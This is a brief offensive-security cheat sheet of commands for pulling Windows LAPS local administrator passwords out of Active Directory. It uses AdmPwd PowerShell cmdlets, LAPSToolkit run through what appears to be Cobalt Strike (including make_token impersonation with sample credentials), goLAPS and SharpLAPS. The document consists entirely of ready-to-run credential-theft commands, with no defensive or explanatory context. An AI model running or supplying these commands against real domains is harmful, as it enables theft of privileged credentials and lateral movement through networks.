### Local Administrator Password Solution
```
PowerShell Get-Command *AdmPwd*
PowerShell Get-AdmPwdPassword -ComputerName Alice_PC | fl

```
```
powershell-import C:\Users\Commando\Desktop\LAPSToolkit.ps1
powerpick Get-LAPSComputers
powershell Find-LAPSDelegatedGroups
make_token MeMe 123456qWE
make_token insomnia.io\MeMe 123456qWE
```
### goLAPS
```
golaps-v0.1.1-windows-amd64.exe -D <IP|FQDN> -u john -d activebreach.io -p 123456 
```
### SharpLAPS

```
SharpLAPS.exe /user:DOMAIN\User /pass:MyP@ssw0rd123! /host:192.168.1.1
```
